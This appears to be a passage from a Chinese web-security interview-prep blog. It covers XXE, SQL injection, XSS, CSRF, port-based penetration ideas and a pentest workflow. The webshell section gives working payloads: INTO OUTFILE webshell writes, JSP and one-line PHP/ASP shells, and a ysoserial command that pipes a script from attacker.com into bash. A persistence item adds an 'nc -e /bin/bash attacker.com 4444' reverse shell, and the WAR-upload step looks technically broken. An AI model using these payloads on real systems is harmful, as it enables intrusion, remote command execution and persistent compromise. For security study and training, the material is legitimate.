<p>这段XML定义了一个外部实体<code>scan</code>，它引用了内网中的一个URL。当应用程序解析这个XML时，会尝试访问该URL，从而暴露了内网的存在。</p>
<h4 id="3-拒绝服务攻击（DoS）"><a href="#3-拒绝服务攻击（DoS）" class="headerlink" title="3. 拒绝服务攻击（DoS）"></a>3. 拒绝服务攻击（DoS）</h4><p>攻击者可以通过XXE漏洞发起拒绝服务攻击。例如，攻击者可以提交以下XML数据：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///dev/zero&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///dev/zero&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///dev/zero&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;a;</span><span class="symbol">&amp;b;</span><span class="symbol">&amp;c;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段XML定义了多个外部实体，每个实体都引用了一个无限大的文件（如<code>/dev/zero</code>）。当应用程序解析这个XML时，会尝试读取这些文件，导致资源耗尽，从而引发拒绝服务攻击。</p>
<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><h4 id="1-禁用DTD"><a href="#1-禁用DTD" class="headerlink" title="1. 禁用DTD"></a>1. 禁用DTD</h4><p>在XML解析器中禁用DTD（Document Type Definition）可以防止外部实体的解析。例如，在Java中，可以使用以下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure>
<p>这段代码禁用了DTD，从而防止了XXE攻击。</p>
<h4 id="2-禁止外部实体解析"><a href="#2-禁止外部实体解析" class="headerlink" title="2. 禁止外部实体解析"></a>2. 禁止外部实体解析</h4><p>在XML解析器中禁止外部实体解析。例如，在Java中，可以使用以下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure>
<p>这段代码禁止了外部实体的解析，从而防止了XXE攻击。</p>
<h4 id="3-通过黑名单过滤用户提交的XML数据"><a href="#3-通过黑名单过滤用户提交的XML数据" class="headerlink" title="3. 通过黑名单过滤用户提交的XML数据"></a>3. 通过黑名单过滤用户提交的XML数据</h4><p>在应用程序中，可以使用黑名单来过滤用户提交的XML数据，防止恶意构造的XML数据被解析。例如，可以使用正则表达式来检测XML数据中是否包含外部实体的定义：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">xmlData</span> <span class="operator">=</span> ...; <span class="comment">// 用户提交的XML数据</span></span><br><span class="line"><span class="keyword">if</span> (xmlData.contains(<span class="string">&quot;&lt;!ENTITY&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;XXE attack detected&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="任意文件下载漏洞的修复方案"><a href="#任意文件下载漏洞的修复方案" class="headerlink" title="任意文件下载漏洞的修复方案"></a>任意文件下载漏洞的修复方案</h2><p>1）过滤用户数据，如“&#x2F;”，“*”，”.”等特殊字符<br>2）更新中间件<br>3）要下载的文件地址保存至数据库中<br>4）文件路径保存至数据库，让用户提交文件对应 ID 或 session 下载文件<br>5）用户下载文件之前需要进行权限判断<br>6）文件放在 web 无法直接访问的目录下<br>7）不允许提供目录遍历服务<br>8）公开文件可放置在 web 应用程序下载目录中通过链接进行下载</p>
<h2 id="CSRF-攻击和-XSS-攻击有什么区别"><a href="#CSRF-攻击和-XSS-攻击有什么区别" class="headerlink" title="CSRF 攻击和 XSS 攻击有什么区别"></a>CSRF 攻击和 XSS 攻击有什么区别</h2><p>CSRF 攻击不需要将恶意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击。<br>CSRF 攻击成本也比 XSS 低，用户每天都要访问大量网页，无法确认每一个网页的合法性，从用户角度来说，无法彻底防止 CSRF 攻击。</p>
<h2 id="发现-demo-jsp-uid-110-注入点，你有哪几种思路获取-webshell，哪种是优选"><a href="#发现-demo-jsp-uid-110-注入点，你有哪几种思路获取-webshell，哪种是优选" class="headerlink" title="发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取 webshell，哪种是优选"></a>发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取 webshell，哪种是优选</h2><p>有写入权限的，构造联合查询语句使用 using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高。<br>通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell。</p>
<p><strong>适用前提：</strong></p>
<ul>
<li>目标数据库是 MySQL，并且当前数据库用户有 <code>FILE</code> 权限。</li>
<li>Web 目录（如 <code>htdocs</code>、<code>www</code>）对数据库用户是可写的。</li>
</ul>
<p><strong>利用方式：</strong><br>如果数据库用户拥有 <code>FILE</code> 权限，可以使用 <code>INTO OUTFILE</code> 直接写入 WebShell：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span></span><br></pre></td></tr></table></figure>
<p>或者在 Windows 下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;C:\\xampp\\htdocs\\shell.php&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这样 <code>shell.php</code> 便可通过 <code>POST</code> 方式执行任意命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data <span class="string">&quot;cmd=system(&#x27;whoami&#x27;);&quot;</span> http://target.com/shell.php</span><br></pre></td></tr></table></figure>

<p><strong>局限性：</strong></p>
<ul>
<li><code>secure_file_priv</code> 可能会限制 <code>OUTFILE</code> 的使用。</li>
<li>Web 服务器可能禁止 <code>.php</code> 解析（如使用 <code>htaccess</code> 限制）。</li>
<li>需要确认 Web 目录的路径，若不清楚可以尝试写入 <code>/tmp/</code> 再尝试文件包含。</li>
</ul>
<p><strong>优化方案：</strong><br>可以结合 <strong>SQLMap</strong> 自动执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com/demo.jsp?uid=110&quot;</span> --file-write=<span class="string">&quot;shell.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/shell.php&quot;</span></span><br></pre></td></tr></table></figure>
<p>然后访问 <code>http://target.com/shell.php</code>，即可执行任意 PHP 代码。</p>
<p><strong>2. 使用 <code>LOAD_FILE()</code> 读取 WebShell</strong><br>如果 <code>INTO OUTFILE</code> 受限，但 <code>LOAD_FILE()</code> 可用，可以读取已有 WebShell 或配合 <strong>文件包含漏洞（LFI）</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;/var/www/html/config.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>如果 Web 服务器存在 <strong>文件包含漏洞</strong>，可以结合 SQL 注入利用：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>然后通过 <strong>LFI</strong> 访问 <code>/tmp/shell.php</code>。</p>
<p><strong>3. SQLMap 自动获取 Shell</strong><br><code>sqlmap</code> 自带 <code>--os-shell</code> 选项，可以自动执行系统命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com/demo.jsp?uid=110&quot;</span> --os-shell</span><br></pre></td></tr></table></figure>
<p>如果数据库用户具备 <strong>写文件权限</strong>，SQLMap 会自动创建 WebShell，并提供交互式命令行。</p>
<h3 id="1-MySQL-JSP：写入-WebShell"><a href="#1-MySQL-JSP：写入-WebShell" class="headerlink" title="(1) MySQL+JSP：写入 WebShell"></a><strong>(1) MySQL+JSP：写入 WebShell</strong></h3><p>如果 Web 服务器运行的是 JSP，并且 <code>INTO OUTFILE</code> 可用，可以写入 <code>.jsp</code> WebShell：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;% Runtime.getRuntime().exec(request.getParameter(\&quot;cmd\&quot;)); %&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.jsp&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>然后通过：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://target.com/shell.jsp?cmd=id&quot;</span></span><br></pre></td></tr></table></figure>
<p>执行命令。</p>
<h3 id="2-MySQL-Tomcat：写入-WAR-WebShell"><a href="#2-MySQL-Tomcat：写入-WAR-WebShell" class="headerlink" title="(2) MySQL+Tomcat：写入 WAR WebShell"></a><strong>(2) MySQL+Tomcat：写入 WAR WebShell</strong></h3><p>如果 <code>INTO OUTFILE</code> 受限，但数据库用户有 <strong>写入 Web 目录权限</strong>，可以直接上传 <code>.war</code> 文件：</p>
<ol>
<li>生成 <strong>JSP WebShell</strong>：<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;% </span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>); </span><br><span class="line">    <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
<li>压缩为 <code>.war</code>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure></li>
<li>使用 SQL 注入上传：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;context&gt;&lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;&lt;/context&gt;&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/usr/local/tomcat/webapps/shell.war&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
<li>访问 <code>http://target.com/shell/cmd.jsp?cmd=id</code>，成功执行命令。</li>
</ol>
<h3 id="5-通过-Java-反序列化漏洞-Getshell"><a href="#5-通过-Java-反序列化漏洞-Getshell" class="headerlink" title="5. 通过 Java 反序列化漏洞 Getshell"></a><strong>5. 通过 Java 反序列化漏洞 Getshell</strong></h3><p>如果目标应用使用了 <strong>Apache Commons Collections</strong>、<code>fastjson</code> 等，可能存在 Java 反序列化漏洞：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 <span class="string">&quot;curl http://attacker.com/shell.sh | bash&quot;</span> &gt; payload.ser</span><br></pre></td></tr></table></figure>
<p>然后通过 SQL 注入写入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (username, password) <span class="keyword">VALUES</span> (<span class="string">&#x27;admin&#x27;</span>, LOAD_FILE(<span class="string">&#x27;/tmp/payload.ser&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>如果应用程序读取 <code>users</code> 表数据，可能触发反序列化漏洞，执行恶意命令。</p>
<h3 id="6-Java-WebShell-持久化方式"><a href="#6-Java-WebShell-持久化方式" class="headerlink" title="6. Java WebShell 持久化方式"></a><strong>6. Java WebShell 持久化方式</strong></h3><p>如果成功 Getshell，可以持久化访问：</p>
<ol>
<li>**修改 Tomcat <code>web.xml</code>**：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>shell<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp-file</span>&gt;</span>/shell.jsp<span class="tag">&lt;/<span class="name">jsp-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>利用 ScheduledTask 创建反向 Shell</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;nc -e /bin/bash attacker.com 4444&quot;</span>);</span><br></pre></td></tr></table></figure></li>
<li><strong>植入 Java Agent</strong>（适用于 Spring Boot）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:shell.jar -jar target.jar</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="说出至少三种业务逻辑漏洞，以及修复方式"><a href="#说出至少三种业务逻辑漏洞，以及修复方式" class="headerlink" title="说出至少三种业务逻辑漏洞，以及修复方式"></a>说出至少三种业务逻辑漏洞，以及修复方式</h2><p>密码找回漏洞中存在：密码允许暴力破解 存在通用型找回凭证 可以跳过验证步骤 找回凭证可以拦包获取 等方式来通过厂商提供的密码找回功能来得到密码。<br>身份认证漏洞中最常见的是： 会话固定攻击 Cookie 仿冒 只要得到 Session 或 Cookie 即可伪造用户身份。<br>验证码漏洞中存在： 验证码允许暴力破解 验证码可以通过 Javascript 或者改包的方法来进行绕过</p>
<h2 id="sqlmap-怎么对一个注入点注入"><a href="#sqlmap-怎么对一个注入点注入" class="headerlink" title="sqlmap 怎么对一个注入点注入**"></a>sqlmap 怎么对一个注入点注入**</h2><ol>
<li>如果是 GET 型注入点，直接使用命令：<code>sqlmap -u &quot;注入点网址&quot;</code></li>
<li>如果是 POST 型注入点，可以使用命令：<code>sqlmap -u &quot;注入点网址&quot; --data=&quot;post 的参数&quot;</code></li>
<li>如果是 cookie、X-Forwarded-For 等，可以在访问的时候，用 Burp Suite 抓包，将注入点用引号替换，放到文件里，然后使用命令：<code>sqlmap -r &quot;文件地址&quot;</code></li>
</ol>
<h2 id="延时注入如何来判断"><a href="#延时注入如何来判断" class="headerlink" title="延时注入如何来判断"></a>延时注入如何来判断</h2><p>if(ascii(substring(“hello”, 1, 1))&#x3D;104, sleep(5), 1)</p>
<h2 id="OWASP-漏洞都有哪些"><a href="#OWASP-漏洞都有哪些" class="headerlink" title="OWASP 漏洞都有哪些**"></a>OWASP 漏洞都有哪些**</h2><ol>
<li>SQL 注入防护方法</li>
<li>失效的身份认证和会话管理</li>
<li>跨站脚本攻击 XSS</li>
<li>直接引用不安全的对象</li>
<li>安全配置错误配置</li>
<li>敏感信息泄露</li>
<li>缺少功能级的访问控制</li>
<li>跨站请求伪造 CSRF</li>
<li>使用含有已知漏洞的组件</li>
<li>未验证的重定向和转发</li>
</ol>
<h2 id="SQL-里面只有-update-怎么利用"><a href="#SQL-里面只有-update-怎么利用" class="headerlink" title="SQL 里面只有 update 怎么利用**"></a>SQL 里面只有 update 怎么利用**</h2><p>先理解这句 SQL：<code>UPDATE user SET password=&#39;MD5($password)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</code><br>如果此 SQL 被修改成以下形式，就实现了注入。</p>
<ol>
<li><p>修改 homepage 值为 <code>http://xxx.net&#39;, userlevel=&#39;3</code><br>之后 SQL 语句变为：<code>UPDATE user SET password=&#39;mypass&#39;, homepage=&#39;http://xxx.net&#39;, userlevel=&#39;3&#39; WHERE id=&#39;$id&#39;</code><br>userlevel 为用户级别</p>
</li>
<li><p>修改 password 值为 <code>mypass&#39;)&#39; WHERE username=&#39;admin&#39;#</code><br>之后 SQL 语句变为：<code>UPDATE user SET password=&#39;MD5(mypass)&#39; WHERE username=&#39;admin&#39;#&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</code></p>
</li>
<li><p>修改 id 值为 <code>&#39; OR username=&#39;admin&#39;</code><br>之后 SQL 语句变为：<code>UPDATE user SET password=&#39;MD5($password)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;&#39; OR username=&#39;admin&#39;</code></p>
</li>
</ol>
<h3 id="讲解："><a href="#讲解：" class="headerlink" title="讲解："></a>讲解：</h3><p>这段内容描述了在SQL注入攻击中，如何利用<code>UPDATE</code>语句进行注入攻击。SQL注入是一种常见的网络攻击方式，攻击者通过在SQL语句中插入恶意代码，以获取、修改或删除数据库中的数据。</p>
<ol>
<li><strong>修改<code>homepage</code>值</strong>：通过将<code>homepage</code>参数修改为包含单引号的URL，可以破坏原有的SQL语句结构，使得SQL语句执行攻击者想要的操作。例如，添加<code>userlevel</code>参数可以插入额外的SQL命令。</li>
<li><strong>修改<code>password</code>值</strong>：通过在<code>password</code>参数中插入单引号和注释符号<code>#</code>，可以注释掉<code>WHERE</code>子句后面的内容，使得<code>WHERE</code>条件失效，从而影响所有用户。</li>
<li><strong>修改<code>id</code>值</strong>：通过将<code>id</code>参数修改为<code>&#39; OR username=&#39;admin&#39;</code>，可以绕过<code>WHERE</code>条件，使得<code>UPDATE</code>语句对所有用户名为<code>admin</code>的用户生效。</li>
</ol>
<h2 id="DOM-型和-XSS-自动化测试或人工测试"><a href="#DOM-型和-XSS-自动化测试或人工测试" class="headerlink" title="DOM 型和 XSS 自动化测试或人工测试**"></a>DOM 型和 XSS 自动化测试或人工测试**</h2><p>人工测试思路：找到类似 <code>document.write</code>、<code>innerHTML</code> 赋值、<code>outerHTML</code> 赋值、<code>window.location</code> 操作、写 <code>javascript</code> 后内容、<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code> 等直接执行之类的函数点。<br>找到其变量，回溯变量来源观察是否可控，是否经过安全函数。自动化测试参考道哥的博客，思路是从输入入手，观察变量传递的过程，最终检查是否存在危险函数输出，中途是否有经过安全函数。但是这样就需要有一个 <code>javascript</code> 解析器，否则会漏掉一些通过 <code>js</code> 执行带入的部分内容。</p>
<h2 id="对于-XSS-怎么修补建议"><a href="#对于-XSS-怎么修补建议" class="headerlink" title="对于 XSS 怎么修补建议"></a>对于 XSS 怎么修补建议</h2><p>输入点检查：对用户输入的数据进行合法性检查，使用 filter 过滤敏感字符或对输入进行编码转义，针对特定类型数据进行格式检查。针对输入点的检查最好放在服务器端实现。<br>输出点检查：对变量输出到 HTML 页面中时，对输出内容进行编码转义，输出在 HTML 中时，对其进行 HTMLEncode，如果输出在 Javascript 脚本中时，对其进行 JavascriptEncode。对使用 JavascriptEncode 的变量都放在引号中并转义危险字符，data 部分就无法逃逸出引号外成为 code 的一部分。还可以使用更加严格的方法，对所有数字字母之外的字符都使用十六进制编码。此外，要注意在浏览器中，HTML 的解析会优先于 Javascript 的解析，编码的方式也需要考虑清楚。<br>除此之外，还有做 HTTPOnly 对 Cookie 劫持做限制。</p>
<h2 id="CSRF-的防御"><a href="#CSRF-的防御" class="headerlink" title="CSRF 的防御"></a>CSRF 的防御</h2><p>验证 Referer、添加 token</p>
<h2 id="token-和-referer-做横向对比，谁安全等级高"><a href="#token-和-referer-做横向对比，谁安全等级高" class="headerlink" title="token 和 referer 做横向对比，谁安全等级高"></a>token 和 referer 做横向对比，谁安全等级高</h2><p>token 安全等级更高，因为并不是任何服务器都可以取得 referer，如果从 HTTPS 跳到 HTTP，也不会发送 referer。并且 FLASH 一些版本中可以自定义 referer。但是 token 的话，要保证其足够随机且不可泄露。</p>
<h2 id="对-referer-的验证，从什么角度去做？如果做，怎么杜绝问题"><a href="#对-referer-的验证，从什么角度去做？如果做，怎么杜绝问题" class="headerlink" title="对 referer 的验证，从什么角度去做？如果做，怎么杜绝问题"></a>对 referer 的验证，从什么角度去做？如果做，怎么杜绝问题</h2><p>对 header 中的 referer 的验证，一个是空 referer，一个是 referer 过滤或者检测不完善。为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。</p>
<h2 id="针对-token-攻击，你会对-token-的哪方面进行测试"><a href="#针对-token-攻击，你会对-token-的哪方面进行测试" class="headerlink" title="针对 token 攻击，你会对 token 的哪方面进行测试"></a>针对 token 攻击，你会对 token 的哪方面进行测试</h2><p>针对 token 的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击。信息泄露有可能是缓存、日志、get，也有可能是利用跨站。很多跳转登录的都依赖 token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了。<br>另外也可以结合着其它业务来描述 token 的安全性及设计不好怎么被绕过比如抢红包业务之类的。</p>
<h2 id="简述你知道的一句话木马"><a href="#简述你知道的一句话木马" class="headerlink" title="简述你知道的一句话木马**"></a>简述你知道的一句话木马**</h2><p>ASP：<code>&lt;%eval request(&quot;cmd&quot;)%&gt;</code><br>ASP.NET：（aspx）<code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;)%&gt;</code><br>PHP：<code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;]);?&gt;</code></p>
<h2 id="假设渗透时发现服务器开了-21-80-445-3306-11211-端口，你有什么渗透思路"><a href="#假设渗透时发现服务器开了-21-80-445-3306-11211-端口，你有什么渗透思路" class="headerlink" title="假设渗透时发现服务器开了 21, 80, 445, 3306, 11211 端口，你有什么渗透思路"></a>假设渗透时发现服务器开了 21, 80, 445, 3306, 11211 端口，你有什么渗透思路</h2><p>针对 21 端口：21 端口开放表明运行 FTP 服务，可以尝试对 FTP 进行爆破和尝试匿名 anonymous&#x2F;空登陆。以及使用 MS12-073 的攻击尝试。<br>针对 80 端口：80 端口对应 web 服务，可通过信息收集，分析出去中间件类型和版本，后端语言类型。还有 CMS 类型，看是否有已知漏洞可利用。若无，对 Web 站点进行渗透测试，查看是否存在注入等漏洞。<br>针对 445 端口：445 端口对应网络共享 SMB 服务，可尝试利用 ms08-067, ms17-010 等溢出漏洞对服务器进行攻击。也可以尝试使用 IPC$进行攻击。<br>针对 3306 mysql 端口：3306 端口也可以采用爆破的方式。成功后可以用 mysql 写 webshell，或者构造 VBS 写入服务器启动项，带服务器重启就可以添加管理员账号和打开 3389 端口。<br>针对 11211 端口：11211 端口是 memcached 服务的端口。memcached 默认情况下存在未授权访问漏洞，telnet ip 就可以获得服务器敏感信息。对进一步渗透提供帮助。</p>
<h2 id="假设渗透时发现服务器开放了-22、8088、8161、6379-端口，你有什么渗透思路"><a href="#假设渗透时发现服务器开放了-22、8088、8161、6379-端口，你有什么渗透思路" class="headerlink" title="假设渗透时发现服务器开放了 22、8088、8161、6379 端口，你有什么渗透思路"></a>假设渗透时发现服务器开放了 22、8088、8161、6379 端口，你有什么渗透思路</h2><ol>
<li>22 端口是 Linux 服务器的 SSH 远程登录协议，一般使用爆破的方法</li>
<li>8088 端口是 Hadoop Yarn 资源管理系统 REST API存在未授权漏洞.通过 curl -v -X POST申请新的application，构造任务后即可在相应目录生成webshell</li>
<li>8161 运行着 Apache ActiveMQ。其 Console 存在默认端口和默认密码&#x2F;未授权访问(默认密码为 admin:admin)。当 ActiveMQ 开启 PUT 请求时(默认开启)，构造好 Payload(即不存在的目录)，Response 会返回相应的物理路径信息。ActiveMQ 默认开启 PUT 方法，当 fileserver 存在时我们可以上传 jspwebshell。ActiveMQ 除了支持 PUT 协议之外，还支持 MOVE 协议，可导致任意文件移动漏洞。</li>
<li>6379 是 Redis 数据库的默认端口，Redis 未授权访问可以导致未授权访问，通过连接 redis（redis-cli） 可直接写入 webshell。写入 webshell 后利用冰蝎、蚁剑等工具连接，获取 shell。以及写入 SSH 公钥，获取服务器权限。具体操作可参考相关工具文档。</li>
</ol>
<h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><ol>
<li><p>信息收集<br>a、服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）<br>b、网站指纹识别（包括，cms，cdn，证书等），dns记录<br>c、whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）<br>d、子域名收集，旁站，C段等<br>e、google hacking 针对化搜索，pdf文件，中间件版本，弱口令扫描等<br>f、扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等<br>g、传输协议，通用漏洞，exp，github源码等</p>
</li>
<li><p>漏洞挖掘<br>a、浏览网站，看看网站规模，功能，特点等<br>b、端口，弱口令，目录等扫描，对响应的端口进行漏洞探测，比如 rsync,心脏滴血，mysql,ftp,ssh 弱口令等。<br>c、XSS，SQL 注入，上传，命令注入，CSRF，cookie 安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</p>
</li>
<li><p>漏洞利用&amp;权限提升<br>a、mysql 提权，serv-u 提权，oracle 提权<br>b、windows 溢出提权<br>c、linux 脏牛，内核漏洞提权</p>
</li>
<li><p>清除测试数据&amp;输出报告<br>日志，测试数据的清理<br>总结，输出渗透测试报告，附修复方案</p>
</li>
</ol>
